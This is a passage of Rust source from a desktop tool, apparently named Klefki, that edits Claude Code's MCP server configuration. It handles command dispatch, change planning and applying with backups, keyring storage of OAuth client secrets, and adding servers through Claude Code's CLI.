        let shared = Arc::clone(&shared);
        std::thread::spawn(move || worker(&shared));
    }

    let watch = shared.config.watch_interval.map(|interval| {
        Watch::start(interval, shared.config.watch_settle, move || {
            let _ = input_tx.send(Input::FilesChanged);
        })
    });
    let mut state = State {
        snapshot: Arc::new(Snapshot::default()),
        keys: FileKeys::new(),
        watch,
        sign_in: None,
    };
    let mut plans = Plans::default();
    refresh(&shared, &mut state, false);
    while let Ok(input) = inputs.recv() {
        let command = match input {
            Input::Ui(command) => command,
            Input::FilesChanged => {
                reload_after_change(&shared, &mut state);
                continue;
            }
            Input::Closed => break,
        };
        match command {
            Command::Prepare(changes) => prepare(&shared, &mut plans, &changes),
            Command::Apply(id) => apply(&shared, &mut plans, &mut state, id),
            Command::Discard(id) => {
                plans.stored.remove(&id);
            }
            Command::Refresh { live_all } => refresh(&shared, &mut state, live_all),
            Command::Visible(rows) => {
                let mut queue = lock(&shared.queue);
                queue.visible = rows.into_iter().collect();
                queue.order();
            }
            Command::Check(id) => enqueue_now(&shared, &state, &id, JobKind::Check),
            Command::Diagnose(id) => enqueue_now(&shared, &state, &id, JobKind::Diagnose),
            Command::Inspect(id) => inspect(&shared, &state, id),
            Command::Export(ids) => {
                let sources = crate::export::sources(
                    shared.config.paths.as_ref(),
                    &state.snapshot,
                    &state.keys,
                    &ids,
                );
                shared
                    .emitter
                    .emit(Event::Exported(crate::export::export(sources)));
            }
            Command::ChooseExportFile { name, shown } => {
                let home = shared.config.home.clone();
                // Only the UI's thread may open a dialog (on macOS, AppKit is main-thread only), so without one
                // opened there, a path is asked for instead.
                match shown.and_then(|s| s.take()) {
                    None => {
                        let choice = crate::export_file::not_shown(&name, home.as_deref());
                        shared.emitter.emit(Event::ExportFileChosen(choice));
                    }
                    // The dialog waits for the user, so its answer is waited for on a thread of its own: the engine
                    // keeps going.
                    Some((opened, answer)) => {
                        let emitter = shared.emitter.clone();
                        std::thread::spawn(move || {
                            let picked = pollster::block_on(answer);
                            let choice = crate::export_file::answered(
                                opened,
                                picked,
                                &name,
                                home.as_deref(),
                            );
                            emitter.emit(Event::ExportFileChosen(choice));
                        });
                    }
                }
            }
            Command::SaveExport {
                path,
                text,
                replace,
            } => {
                let result =
                    crate::export_file::save(shared.config.paths.as_ref(), &path, &text, replace);
                let shown = crate::sanitize::shown(&path.to_string_lossy());
                shared.emitter.emit(Event::ExportSaved {
                    path,
                    shown,
                    result,
                });
            }
            Command::ChooseImportFile { shown } => match shown.and_then(|s| s.take()) {
                // Only the UI's thread may open a dialog, so without one opened there, a path is asked for.
                None => shared
                    .emitter
                    .emit(Event::ImportFile(crate::import_file::ImportFile::NoDialog)),
                // Waited for, and the file read, on a thread of its own: the engine keeps going.
                Some((opened, answer)) => {
                    let emitter = shared.emitter.clone();
                    std::thread::spawn(move || {
                        let picked = pollster::block_on(answer);
                        let file = match crate::import_file::answered(opened, picked) {
                            Ok(path) => crate::import_file::read(&path),
                            Err(none) => none,
                        };
                        emitter.emit(Event::ImportFile(file));
                    });
                }
            },
            // Read on a thread of its own too: a path on a network share that stopped answering would hold up
            // every other command.
            Command::ReadImportFile(path) => {
                let emitter = shared.emitter.clone();
                std::thread::spawn(move || {
                    emitter.emit(Event::ImportFile(crate::import_file::read(&path)));
                });
            }
            Command::SecretStatus(id) => secret(&shared, &state.snapshot, id, SecretOp::Status),
            Command::StoreSecret { id, secret: value } => {
                secret(&shared, &state.snapshot, id, SecretOp::Store(value));
            }
            Command::ForgetSecret(id) => secret(&shared, &state.snapshot, id, SecretOp::Forget),
            Command::SignIn(id) => sign_in::start(&shared, &mut state, id),
            Command::SignInPaste { id, address } => sign_in::paste(&state, &id, address),
            Command::OpenSignInPage(id) => sign_in::open_again(&shared, &state, &id),
            Command::KeepWaitingForSignIn(id) => sign_in::keep_waiting(&state, &id),
            Command::CancelSignIn(id) => sign_in::cancel(&state, &id),
            Command::CheckCallbackPort(port) => shared.emitter.emit(Event::CallbackPort {
                port,
                warning: crate::form::callback_port_warning(port),
            }),
            Command::Activity => shared
                .emitter
                .emit(Event::Activity(match backup_dir(&shared) {
                    Ok(dir) => crate::activity::load(&dir),
                    Err(problem) => crate::activity::Activity {
                        problem: Some(problem),
                        ..Default::default()
                    },
                })),
            Command::Desktop => shared
                .emitter
                .emit(Event::Desktop(crate::desktop::load(&shared.config.desktop))),
            Command::Secrets => secrets(&shared, &state, SecretsAsk::List),
            Command::SecretsAfterFileChange => secrets(&shared, &state, SecretsAsk::Reuse),
            Command::ForgetUnusedSecret(connection) => {
                secrets(&shared, &state, SecretsAsk::Forget(connection));
            }
        }
    }
    // The UI is gone: a sign-in still running is stopped, so no `claude` keeps listening after Klefki closes.
    sign_in::stop(&mut state);
    // The UI is gone: let the workers finish what they are doing and stop.
    lock(&shared.queue).shutdown = true;
    shared.wake_workers.notify_all();
}

enum SecretOp {
    Status,
    Store(Secret),
    Forget,
}

/// Looks up, stores or forgets a server's client secret, on a thread of its own: a store may be slow, or ask the
/// user (macOS shows a keychain prompt). Only servers that sign in with OAuth have one.
fn secret(shared: &Shared, snapshot: &Snapshot, id: ServerId, op: SecretOp) {
    let answer = |stored: Result<bool, String>| {
        shared.emitter.emit(Event::SecretStatus {
            id: id.clone(),
            stored,
        });
    };
    let Some(row) = snapshot.servers.iter().find(|r| r.is(&id)) else {
        return answer(Err(format!(
            "{} is no longer in the configuration.",
            sanitize(&id.name)
        )));
    };
    if row.oauth.is_none() {
        return answer(Err(format!(
            "{} does not sign in with OAuth, so it has no client secret.",
            sanitize(&id.name)
        )));
    }
    if matches!(&op, SecretOp::Store(s) if s.is_empty()) {
        return answer(Err("The client secret is empty.".to_owned()));
    }
    let store = match secret_store(shared) {
        Ok(store) => store,
        Err(e) => return answer(Err(e.to_string())),
    };
    let connection = row.connection.clone();
    let emitter = shared.emitter.clone();
    std::thread::spawn(move || {
        let stored = match op {
            SecretOp::Status => store.get(&connection).map(|s| s.is_some()),
            SecretOp::Store(value) => store.set(&connection, &value).map(|()| true),
            SecretOp::Forget => store.delete(&connection).map(|_| false),
        };
        emitter.emit(Event::SecretStatus {
            id,
            stored: stored.map_err(|e| e.to_string()),
        });
    });
}

/// How the Secrets page asks about the system's store.
enum SecretsAsk {
    /// List it again.
    List,
    /// Use its last listing, if there is one.
    Reuse,
    /// Delete this unused client secret, if nothing uses it, then list the store again.
    Forget(crate::model::ConnectionId),
}

/// The Secrets page: the definitions are read here, the system's store is listed on a thread of its own (it may be
/// slow, or ask the user to unlock it).
fn secrets(shared: &Arc<Shared>, state: &State, ask: SecretsAsk) {
    let report = crate::secret_uses::read(
        shared.config.paths.as_ref(),
        shared.config.home.as_deref(),
        &state.snapshot,
        &state.keys,
    );
    let snapshot = Arc::clone(&state.snapshot);
    let shared = Arc::clone(shared);
    std::thread::spawn(move || {
        // Definitions Klefki keeps to put back still use their client secret.
        let kept: Vec<crate::model::ConnectionId> = shared
            .config
            .backup_dir
            .as_deref()
            .map(swap::Recovery::files)
            .unwrap_or_default()
            .iter()
            .flat_map(swap::Recovery::connections)
            .collect();
        let reused = match ask {
            SecretsAsk::Reuse => lock(&shared.secrets_listed).clone(),
            _ => None,
        };
        let listed = match reused {
            Some(listed) => listed,
            None => list_secrets(&shared, &snapshot, &kept, ask),
        };
        shared
            .emitter
            .emit(Event::Secrets(crate::secret_uses::with_store(
                report, &snapshot, listed, &kept,
            )));
    });
}

/// The connections the system's store keeps a client secret for, or why it could not say; after deleting `ask`'s
/// unused secret. Remembered for [`SecretsAsk::Reuse`].
fn list_secrets(
    shared: &Shared,
    snapshot: &Snapshot,
    kept: &[crate::model::ConnectionId],
    ask: SecretsAsk,
) -> Result<Vec<crate::model::ConnectionId>, String> {
    let store = secret_store(shared);
    if let SecretsAsk::Forget(connection) = ask {
        let used = snapshot
            .servers
            .iter()
            .any(|r| r.connection == connection && r.oauth.is_some())
            || kept.contains(&connection);
        let result = if used {
            Err("A server uses this client secret now, so it was kept.".to_owned())
        } else {
            match &store {
                Ok(store) => store
                    .delete(&connection)
                    .map(|_| ())
                    .map_err(|e| sanitize(&e.to_string())),
                Err(e) => Err(sanitize(&e.to_string())),
            }
        };
        shared
            .emitter
            .emit(Event::UnusedSecretForgotten { connection, result });
    }
    let listed = match &store {
        Ok(store) => store.list().map_err(|e| e.to_string()),
        Err(e) => Err(e.to_string()),
    };
    // A store that cannot be opened matters only when a server signs in with OAuth.
    let signs_in = snapshot.servers.iter().any(|r| r.oauth.is_some());
    let listed = match listed {
        Err(_) if !signs_in => Ok(Vec::new()),
        listed => listed,
    };
    *lock(&shared.secrets_listed) = Some(listed.clone());
    listed
}

/// The store client secrets are kept in: the one tests give, else the system's own, opened the first time it is
/// needed and kept.
fn secret_store(shared: &Shared) -> Result<Arc<dyn SecretStore>, crate::secrets::SecretError> {
    let mut held = lock(&shared.secret_store);
    match (&*held, &shared.config.secrets) {
        (Some(store), _) | (None, Some(store)) => Ok(Arc::clone(store)),
        (None, None) => {
            let store: Arc<dyn SecretStore> = Arc::new(crate::secrets::Keyring::platform()?);
            *held = Some(Arc::clone(&store));
            Ok(store)
        }
    }
}

fn inspect(shared: &Shared, state: &State, id: ServerId) {
    // The row's own scope, and the name and project as the file spells them (not as shown: cleaned, cut).
    let found = inventory::locate(&state.snapshot, &state.keys, &id);
    let in_repository = found.is_some_and(|(row, _)| row.scope == Scope::Project);
    let json = match (&shared.config.paths, found) {
        (None, _) => {
            Err("Could not determine where Claude Code keeps its configuration.".to_owned())
        }
        (Some(_), None) => Err("the server is no longer in the configuration".to_owned()),
        (Some(paths), Some((_, file))) => {
            inventory::server_entry(paths, file.project.as_deref(), &file.name, in_repository)
                .and_then(|entry| {
                    serde_json::to_string_pretty(&entry::masked(&entry)).map_err(|e| e.to_string())
                })
        }
    };
    shared.emitter.emit(Event::Entry {
        id,
        // Text from the files, shown in an editor: no control or bidi characters.
        json: json.map(|j| sanitize(&j)).map_err(|e| sanitize(&e)),
        editable: !in_repository,
    });
}

/// A prepared change: one plan per file, written settings files first and `.claude.json` last, after the servers
/// Claude Code adds, moves and changes itself.
struct Stored {
    parts: Vec<(Plan, Docstore)>,
    guards: Vec<ops::Guard>,
    cli: Option<CliSteps>,
    /// Kept definitions to forget, once everything else is done.
    forget: Vec<String>,
    /// What the review said the plan does, for the activity log.
    summary: Vec<String>,
}

/// What Claude Code does with its own commands: servers it adds, servers it removes and adds again (or copies), and
/// kept definitions it adds back. With what they will change in `.claude.json` (shown, and checked again just before
/// the first command runs) and the store their client secrets are kept in, when any are involved.
struct CliSteps {
    adds: Vec<ops::CliAdd>,
    swaps: Vec<swap::Swap>,
    put_back: Vec<String>,
    preview: (Plan, Docstore),
    claude: Arc<dyn swap::Claude>,
    store: Option<Arc<dyn SecretStore>>,
}

#[derive(Default)]
struct Plans {
    next: u64,
    stored: HashMap<u64, Stored>,
}

/// Why the secret store cannot be used, and what to do first, in plain words; what the store said after, on its own
/// line.
fn store_problem(e: crate::secrets::SecretError) -> String {
    let which = if cfg!(target_os = "linux") {
        " (GNOME Keyring or KWallet)"
    } else {
        ""
    };
    format!(
        "Klefki can't use your system's secret store. Start or unlock it{which} and press Review again.\n{e}"
    )
}

/// What runs Claude Code's commands that change servers: the CLI found on disk, or the stand-in a test gave.
fn changer(shared: &Shared) -> Option<Arc<dyn swap::Claude>> {
    if let Some(changer) = &shared.config.changer {
        return Some(Arc::clone(changer));
    }
    Some(Arc::new(swap::Program {
        path: claude_program(shared)?,
        env: shared.config.cli_env.clone(),
        timeout: shared.config.check_timeout,
    }))
}

/// For each server moved or copied into a project whose entry switches that name off: it arrives switched off there.
fn stays_off(changes: &[Change], text: &str) -> Vec<String> {
    let arrivals: Vec<(&str, &str)> = changes
        .iter()
        .flat_map(|change| match change {
            Change::Move {
                id,
                to: crate::model::Target::Local(project),
            } => vec![(id.name.as_str(), project.as_str())],
            Change::Duplicate { name, targets, .. } => targets
                .iter()
                .filter_map(|t| match t {
                    crate::model::Target::Local(project) => Some((name.as_str(), project.as_str())),
                    crate::model::Target::User => None,
                })
                .collect(),
            _ => Vec::new(),
        })
        .collect();
    if arrivals.is_empty() {
        return Vec::new();
    }
    let Ok(root) = serde_json::from_str::<serde_json::Value>(text.trim_start_matches('\u{feff}'))
    else {
        return Vec::new();
    };
    let projects = root.get("projects").and_then(serde_json::Value::as_object);
    arrivals
        .into_iter()
        .filter(|(name, project)| {
            let wanted = inventory::normalise_project(project);
            projects.into_iter().flatten().any(|(key, entry)| {
                inventory::normalise_project(key) == wanted
                    && entry
                        .get("disabledMcpServers")
                        .and_then(serde_json::Value::as_array)
                        .is_some_and(|off| off.iter().any(|n| n.as_str() == Some(name)))
            })
        })
        .map(|(name, project)| {
            let (name, folder) = (sanitize(name), sanitize(&ops::folder_name(project)));
            format!("{name} is switched off in {folder}, so it stays off there. Switch it on there to use it.")
        })
        .collect()
}

/// Adds a change to the activity log. A log that cannot be written leaves the change as it is; what went wrong is
/// returned, to be said with the result.
fn log_activity(
    shared: &Shared,
    summary: &[String],
    error: Option<&str>,
    backups: &[PathBuf],
) -> Option<String> {
    let dir = shared.config.backup_dir.as_ref()?;
    crate::activity::record(dir, summary, error, backups)
        .err()
        .map(|e| format!("The change is saved, but it could not be added to the activity log: {e}"))
}

fn backup_dir(shared: &Shared) -> Result<PathBuf, String> {
    shared.config.backup_dir.clone().ok_or_else(|| {
        "There is no private folder for backups, so nothing will be changed.".to_owned()
    })
}

fn prepare(shared: &Shared, plans: &mut Plans, changes: &[Change]) {
    let made = (|| {
        let paths = shared.config.paths.as_ref().ok_or_else(|| {
            "Could not determine where Claude Code keeps its configuration.".to_owned()
        })?;
        // Always against the files as they are now, not the snapshot the user last saw. `.claude.json` is read once
        // for both the inventory and the plan.
        let read = fsx::read_limited_bom(&paths.claude_json, inventory::MAX_CLAUDE_JSON);
        let fresh = inventory::load_text(
            paths,
            match &read {
                Ok(text) => Ok(text.as_ref().map(|(t, _)| t.as_str())),
                Err(e) => Err(e.to_string()),
            },
        );
        let mut fresh = fresh;
        fresh.snapshot.kept = kept_list(shared);
        let mut resolved = match changes {
            [Change::Restore { backup }] => {
                let now = match &read {
                    Ok(Some((text, _))) => text.as_str(),
                    Ok(None) => "",
                    Err(e) => {
                        return Err(format!(
                            "The configuration could not be read, so nothing is restored: {e}"
                        ));
                    }
                };
                crate::restore::resolve(&backup_dir(shared)?, backup, now)?
            }
            _ => ops::resolve(changes, &fresh.snapshot, &fresh.keys)?,
        };
        // A kept definition whose removal also took another server's client secret is put back, not forgotten.
        for id in &resolved.forget {
            let kept = swap::Recovery::find(&backup_dir(shared)?, id)?;
            if let Some(why) = swap::forget_problem(&paths.claude_json, &kept) {
                return Err(why);
            }
        }
        // A kept definition's place stays free until it is put back or forgotten: its client secret is filed there.
        let arrivals = resolved.arrivals();
        if !arrivals.is_empty() {
            let dir = backup_dir(shared)?;
            for spot in &arrivals {
                swap::free_of_kept(&dir, spot)?;
            }
        }
        if let Ok(Some((text, _))) = &read {
            resolved.warnings.extend(stays_off(changes, text));
        }
        // What a swap does to other servers' sign-ins depends on what else is in the file.
        let root: serde_json::Value = if resolved.swaps.is_empty() {
            serde_json::Value::Null
        } else {
            read.as_ref()
                .ok()
                .and_then(|t| t.as_ref())
                .and_then(|(t, _)| serde_json::from_str(t).ok())
                .unwrap_or_default()
        };
        let mut parts = Vec::new();
        for (project, ops) in std::mem::take(&mut resolved.settings) {
            let file = Path::new(&project)
                .join(".claude")
                .join("settings.local.json");
            let store = Docstore::project_settings(file, backup_dir(shared)?);
            let plan = store.prepare(ops).map_err(|e| e.to_string())?;
            parts.push((plan, store));
        }
        if !resolved.claude.is_empty() {
            let mut store = Docstore::new(paths.claude_json.clone(), backup_dir(shared)?);
            store.verify_delay = shared.config.verify_delay;
            let claude_ops = std::mem::take(&mut resolved.claude);
            let plan = match read {
                Ok(Some((text, bom))) => store.prepare_text(text, bom, claude_ops),
                _ => store.prepare(claude_ops),
            }
            .map_err(|e| e.to_string())?;
            parts.push((plan, store));
        }
        for (_, store) in &mut parts {
            store.verify_delay = shared.config.verify_delay;
        }
        let cli = if resolved.cli.is_empty()
            && resolved.swaps.is_empty()
            && resolved.put_back.is_empty()
        {
            None
        } else {
            let claude = changer(shared).ok_or(
                "Servers that sign in with OAuth are added and changed with Claude Code's commands (claude mcp add-json and remove), and Klefki cannot find Claude Code.",
            )?;
            // What putting a kept definition back adds, shown like any add.
            for id in &resolved.put_back {
                let kept = swap::Recovery::find(&backup_dir(shared)?, id)?;
                let (op, warning) = swap::preview_put_back(&kept);
                resolved.preview.push(op);
                resolved.warnings.extend(warning);
            }
            // A server a restore puts back gets the client secret Klefki kept for it.
            if resolved.cli.iter().any(|a| a.stored) {
                let store = secret_store(shared).map_err(store_problem)?;
                let mut without = Vec::new();
                for add in resolved.cli.iter_mut().filter(|a| a.stored) {
                    let scope = if add.project.is_some() {
                        Scope::Local
                    } else {
                        Scope::User
                    };
                    let id =
                        crate::model::ConnectionId::new(scope, add.project.as_deref(), &add.name);
                    add.secret = store.get(&id).map_err(store_problem)?;
                    if add.secret.is_none() {
                        without.push(sanitize(&add.name));
                    }
                }
                if !without.is_empty() {
                    resolved.notes.push(format!(
                        "Klefki has no copy of the client secret of {}, so Claude Code keeps none. If a server needs one, enter it on its Auth tab once it is back.",
                        ops::and_list(&without)
                    ));
                }
            }
            let involves_secrets = !resolved.swaps.is_empty() || !resolved.put_back.is_empty();
            // Asked now, so a store that is missing or locked stops the change before anything runs.
            let store = if involves_secrets {
                let store = secret_store(shared).map_err(store_problem)?;
                let mut kept = Vec::new();
                // A swap's warnings (signing in again first) lead: they cost the most.
                let mut first = Vec::new();
                for s in std::mem::take(&mut resolved.swaps) {
                    let copy = store.get(&s.from.connection()).map_err(store_problem)?;
                    let review = swap::review(&root, &s, copy.is_some())?;
                    if review.unchanged {
                        continue;
                    }
                    first.extend(review.warnings);
                    resolved.notes.extend(review.notes);
                    // What the review shows: what Claude Code will write.
                    resolved.preview.extend(swap::preview(&root, &s));
                    kept.push(s);
                }
                resolved.warnings.splice(0..0, first);
                resolved.swaps = kept;
                Some(store)
            } else if resolved.cli.iter().any(|a| a.secret.is_some()) {
                let next = |e| {
                    let mut said = store_problem(e);
                    said = said.replacen(
                        " and press Review again.",
                        " and press Review again, or leave the client secret empty if the server does not need one.",
                        1,
                    );
                    said
                };
                let store = secret_store(shared).map_err(next)?;
                let first = &resolved.cli[0];
                let id = crate::model::ConnectionId::new(
                    if first.project.is_some() {
                        Scope::Local
                    } else {
                        Scope::User
                    },
                    first.project.as_deref(),
                    &first.name,
                );
                store.get(&id).map_err(next)?;
                Some(store)
            } else {
                None
            };
            // A fixed callback port another program holds makes the sign-in fail later, so it is said now. Each
            // server's port is checked once, even when it is added to several places.
            let mut checked = Vec::new();
            for add in &resolved.cli {
                let port = serde_json::from_str::<serde_json::Value>(&add.json)
                    .ok()
                    .and_then(|v| v.pointer("/oauth/callbackPort")?.as_u64())
                    .and_then(|p| u16::try_from(p).ok());
                if let Some(port) = port
                    && !checked.contains(&(add.name.as_str(), port))
                {
                    checked.push((add.name.as_str(), port));
                    if let Some(warning) = crate::form::callback_port_warning(port) {
                        resolved.warnings.push(format!("{}: {warning}", add.name));
                    }
                }
            }
            let docstore = Docstore::new(paths.claude_json.clone(), backup_dir(shared)?);
            let preview = docstore
                .preview(std::mem::take(&mut resolved.preview))
                .map_err(|e| e.to_string())?;
            let nothing = resolved.cli.is_empty()
                && resolved.swaps.is_empty()
                && resolved.put_back.is_empty();
            (!nothing).then(|| CliSteps {
                adds: std::mem::take(&mut resolved.cli),
                swaps: std::mem::take(&mut resolved.swaps),
                put_back: std::mem::take(&mut resolved.put_back),
                preview: (preview, docstore),
                claude,
                store,
            })
        };
        Ok::<_, String>((parts, cli, resolved))
    })();
    match made {
        Ok((parts, cli, resolved)) => {
            let ops::Resolved {
                guards,
                warnings,
                notes,
                summary,
                action,
                destructive,
                reviews,
                forget,
                ..
            } = resolved;
            plans.next += 1;
            let id = plans.next;
            let nothing_to_do =
                cli.is_none() && forget.is_empty() && parts.iter().all(|(plan, _)| plan.is_empty());
            let view = PlanView {
                id,
                summary: summary.clone(),
                action,
                destructive,
                notes: if nothing_to_do { Vec::new() } else { notes },
                files: cli
                    .iter()
                    .map(|c| &c.preview)
                    .chain(&parts)
                    .flat_map(|(plan, _)| plan.changes())
                    .filter(|c| !c.lines.is_empty())
                    .map(|c| FileDiff {
                        path: c.path.clone(),
                        lines: c.lines.clone(),
                    })
                    .collect(),
                // Nothing to approve when nothing would be written.
                reviews: if nothing_to_do { Vec::new() } else { reviews },
                warnings,
                nothing_to_do,
            };
            plans.stored.insert(
                id,
                Stored {
                    parts,
                    guards,
                    cli,
                    forget,
                    summary,
                },
            );
            shared.emitter.emit(Event::PlanReady(view));
        }
        Err(e) => shared.emitter.emit(Event::PlanFailed(sanitize(&e))),
    }
}

fn apply(shared: &Shared, plans: &mut Plans, state: &mut State, id: u64) {
    let fail = |error: String| {
        shared.emitter.emit(Event::ApplyFailed { plan: id, error });
    };
    let Some(Stored {
        parts,
        guards,
        cli,
        forget,
        summary,
    }) = plans.stored.remove(&id)
    else {
        return fail("This change was already applied or discarded. Prepare it again.".to_owned());
    };
    // What the user reviewed must still be what is there.
    if let Some(changed) = guards.iter().find(|g| !g.still_holds()) {
        return fail(format!(
            "{} changed in {} after you looked at it. Nothing was saved; review it again.",
            sanitize(&changed.name),
            sanitize(&changed.project)
        ));
    }
    let mut added = Vec::new();
    let mut backups = Vec::new();
    let mut notes = Vec::new();
    if let Some(steps) = &cli {
        let done = settle(shared)
            .and_then(|()| add_with_claude(shared, state, steps, &mut added))
            .and_then(|()| {
                change_with_claude(
                    shared,
                    state,
                    id,
                    steps,
                    &mut added,
                    &mut backups,
                    &mut notes,
                )
            });
        if let Err(e) = done {
            if !added.is_empty() || !backups.is_empty() {
                log_activity(shared, &summary, Some(&e), &backups);
            }
            return fail(e);
        }
    }
    let mut written = Vec::new();
    // Every file this change starts on, with its sequence number there; each gets checked afterwards, written or not.
    let mut started = Vec::new();
    for (plan, store) in &parts {
        // Numbered before the write, so an earlier change's check that takes the lock after it already knows.
        let lsn = lock(&shared.journals)
            .entry(store.path.clone())
            .or_default()
            .start();
        started.push((store.clone(), lsn));
        match store.apply(plan) {
            Ok(applied) => {
                if applied.wrote {
                    lock(&shared.journals)
                        .entry(store.path.clone())
                        .or_default()
                        .pending
                        .push((lsn, plan.clone()));
                    written.push(plan.clone());
                }
                backups.extend(applied.backup);
            }
            Err(e) => {
                let mut message = e.to_string();
                if !added.is_empty() {
                    message.push_str(&format!(" Claude Code already added {}.", added.join(", ")));
                }
                if !written.is_empty() {
                    let done: Vec<String> = written
                        .iter()
                        .flat_map(|p| p.changes().iter().map(|c| c.path.clone()))
                        .collect();
                    message.push_str(&format!(
                        " Already saved: {}. The rest was not changed.",
                        done.join(", ")
                    ));
                    reload_after_change(shared, state);
                }
                if !added.is_empty() || !written.is_empty() {
                    log_activity(shared, &summary, Some(&message), &backups);
                }
                // This change now numbers last on the file, so the earlier ones' checks stand down for it.
                check_later(shared, id, started);
                return fail(message);
            }
        }
    }
    let mut forgot = false;
    if !forget.is_empty() {
        let dir = match backup_dir(shared) {
            Ok(dir) => dir,
            Err(e) => return fail(e),
        };
        for kept in &forget {
            let claude_json = shared
                .config
                .paths
                .as_ref()
                .map(|p| p.claude_json.as_path());
            let forgot_it = match claude_json {
                Some(claude_json) => swap::forget(&dir, claude_json, kept),
                None => {
                    Err("Could not determine where Claude Code keeps its configuration.".to_owned())
                }
            };
            if let Err(e) = forgot_it {
                if !added.is_empty() || !written.is_empty() || forgot {
                    log_activity(shared, &summary, Some(&e), &backups);
                }
                state.reload(shared);
                return fail(e);
            }
            forgot = true;
        }
    }
    if !written.is_empty() || forgot {
        reload_after_change(shared, state);
    }
    let changed = !written.is_empty() || !added.is_empty() || forgot;
    if changed && let Some(problem) = log_activity(shared, &summary, None, &backups) {
        notes.push(problem);
    }
    check_later(shared, id, started);
    shared.emitter.emit(Event::Applied {
        plan: id,
        changed,
        backup: (!backups.is_empty()).then(|| {
            sanitize(
                &backups
                    .iter()
                    .map(|b| b.display().to_string())
                    .collect::<Vec<_>>()
                    .join(", "),
            )
        }),
        notes: notes.iter().map(|n| sanitize(n)).collect(),
    });
}

/// Makes sure klefki's earlier changes to `.claude.json` whose check is still due are in place now, and retires
/// them, before Claude Code's own commands change the file. Replayed later, they would land on what those commands
/// wrote: an earlier edit of a server would undo a later one made through Claude Code. Their checks, still waiting,
/// stand down.
fn settle(shared: &Shared) -> Result<(), String> {
    let Some(paths) = &shared.config.paths else {
        return Ok(());
    };
    let log: Vec<Plan> = {
        let mut journals = lock(&shared.journals);
        let journal = journals.entry(paths.claude_json.clone()).or_default();
        journal.start();
        std::mem::take(&mut journal.pending)
            .into_iter()
            .map(|(_, plan)| plan)
            .collect()
    };
    if log.is_empty() {
        return Ok(());
    }
    let mut store = Docstore::new(paths.claude_json.clone(), backup_dir(shared)?);
    store.verify_delay = Duration::ZERO;
    store
        .verify(&log, &|| false)
        .map(|_| ())
        .map_err(|e| format!("Nothing was changed: {e}"))
}

/// Has Claude Code remove and add again (or copy) each server of `steps.swaps`, then add back each kept definition
/// of `steps.put_back`, one after the other, each as a transaction that leaves nothing lost (see `swap.rs`). A
/// failure says what is already done.
fn change_with_claude(
    shared: &Shared,
    state: &mut State,
    plan: u64,
    steps: &CliSteps,
    done: &mut Vec<String>,
    backups: &mut Vec<PathBuf>,
    notes: &mut Vec<String>,
) -> Result<(), String> {
    if steps.swaps.is_empty() && steps.put_back.is_empty() {
        return Ok(());
    }
    let paths = shared
        .config
        .paths
        .as_ref()
        .ok_or("Could not determine where Claude Code keeps its configuration.")?;
    let backup_dir = backup_dir(shared)?;
    let made = std::cell::RefCell::new(Vec::new());
    let ctx = swap::Ctx {
        backups: &made,
        claude_json: &paths.claude_json,
        backup_dir: &backup_dir,
        claude: steps.claude.as_ref(),
        store: steps.store.as_deref(),
        home: shared.config.home.as_deref(),
        progress: &|step| {
            shared.emitter.emit(Event::Applying {
                plan,
                step: sanitize(&step),
            })
        },
    };
    let earlier = |done: &[String]| {
        if done.is_empty() {
            String::new()
        } else {
            format!(" Already done: {}.", done.join(", "))
        }
    };
    let ran = steps
        .swaps
        .iter()
        .map(|s| (swap::run(&ctx, s), s.to.words()))
        .chain(
            steps
                .put_back
                .iter()
                .map(|id| (swap::put_back(&ctx, id), "the kept definition".to_owned())),
        );
    for (result, what) in ran {
        // Made whether the step finished or not: a failed one is logged with them.
        backups.append(&mut made.borrow_mut());
        match result {
            Ok(d) => {
                notes.extend(d.notes);
                done.push(what);
            }
            Err(e) => {
                // The list shows where things are now, a kept definition included.
                reload_after_change(shared, state);
                return Err(format!("{e}{}", earlier(done)));
            }
        }
    }
    reload_after_change(shared, state);
    Ok(())
}

/// Has Claude Code add each server of `steps` with `claude mcp add-json`, one after the other, and keeps each client
/// secret in Klefki's store under the new server's connection. `added` collects what was added, in words, so a
/// failure part way can say what is already done. The secret reaches the command only in `MCP_CLIENT_SECRET`.
fn add_with_claude(
    shared: &Shared,
    state: &mut State,
    steps: &CliSteps,
    added: &mut Vec<String>,
) -> Result<(), String> {
    let (preview, docstore) = &steps.preview;
    // What the user reviewed must still fit the file: the name still free in every place.
    docstore.still_applies(preview).map_err(|e| e.to_string())?;
    let done = |added: &[String]| {
        if added.is_empty() {
            String::new()
        } else {
            format!(" Already added: {}.", added.join(", "))
        }
    };
    for add in &steps.adds {
        let name = sanitize(&add.name);
        let place = match &add.project {
            None => "for the user".to_owned(),
            Some(p) => format!("in {}", sanitize(&ops::folder_name(p))),
        };
        // Checked again here: a change in another Klefki may have kept a definition there since the review.
        let spot = swap::Spot {
            project: add.project.clone(),
            name: add.name.clone(),
        };
        if let Some(dir) = &shared.config.backup_dir
            && let Err(why) = swap::free_of_kept(dir, &spot)
        {
            return Err(format!(
                "{name} was not added {place}: {why}{}",
                done(added)
            ));
        }
        let mut args = vec![
            "mcp",
            "add-json",
            "-s",
            if add.project.is_some() {
                "local"
            } else {
                "user"
            },
        ];
        if add.secret.is_some() {
            args.push("--client-secret");
        }
        // The name is checked, but may start with `-`: after `--` it is never read as an option.
        args.extend(["--", add.name.as_str(), add.json.as_str()]);
        // From the folder as the file spells it, so Claude Code files the server under that project's own entry.
        let folder = add.project.as_deref().map(|project| {
            shared.config.paths.as_ref().map_or_else(
                || project.to_owned(),
                |paths| swap::spelled_in(&paths.claude_json, project),
            )
        });
        let cwd = match &folder {
            Some(folder) => Some(Path::new(folder)),
            None => shared.config.home.as_deref(),
        };
        // The secret reaches the command only in `MCP_CLIENT_SECRET`.
        let out = steps.claude.run(&args, cwd, add.secret.as_ref());
        let said = |out: &RunOutput| {
            let text = if out.stderr.trim().is_empty() {
                &out.stdout
            } else {
                &out.stderr
            };
            clip(text.trim(), MAX_DETAIL_CHARS)
        };
        match out {
            Err(e) => {
                return Err(format!(
                    "{name} was not added {place}: Claude Code's command could not be started ({}).{}",
                    sanitize(&e.to_string()),
                    done(added)
                ));
            }
            Ok(out) if out.timed_out => {
                reload_after_change(shared, state);
                return Err(format!(
                    "Claude Code did not finish adding {name} {place} in {} s, so it may or may not be there; look in the list.{}",
                    shared.config.check_timeout.as_secs(),
                    done(added)
                ));
            }
            Ok(out) if out.exit_code != Some(0) => {
                return Err(format!(
                    "{name} was not added {place}. Claude Code said: {}{}",
                    said(&out),
                    done(added)
                ));
            }
            Ok(_) => {}
        }
        reload_after_change(shared, state);
        let row = state.snapshot.servers.iter().find(|r| {
            state
                .keys
                .get(&r.connection)
                .is_some_and(|k| k.name == add.name)
